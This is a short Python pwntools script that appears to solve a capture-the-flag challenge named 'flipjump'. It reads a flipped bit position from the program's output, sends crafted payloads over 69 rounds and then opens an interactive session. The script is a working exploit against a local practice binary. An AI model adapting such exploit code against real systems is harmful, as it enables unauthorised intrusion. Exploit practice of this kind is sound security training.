#!/usr/bin/python3
from pwn import *
context.log_level='debug'
context.arch='amd64'
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)

p=process('./flipjump')

for _ in range(69):
    sa(b"length:\n", p64(0x200))

    payload = b""
    payload += (p64(0x400*8)+p64(0)) * (0x200//0x10)

    sa(b"code:\n", payload)

    # Flip[0] Bit 5 1->0

    res = p.recvline().decode()
    byte = int(res[5])
    log.critical(str(byte))
    bit = int(res[12:14].strip())
    log.critical(str(bit))

    rand = byte * 8 + bit

    sa(b"length:\n", p64(0x200))

    payload = b""
    payload += (p64(0x400*8)+p64(rand)) * (0x200//0x10)

    sa(b"code:\n", payload)
    
    sla(b"N)", b"Y")
    
p.interactive()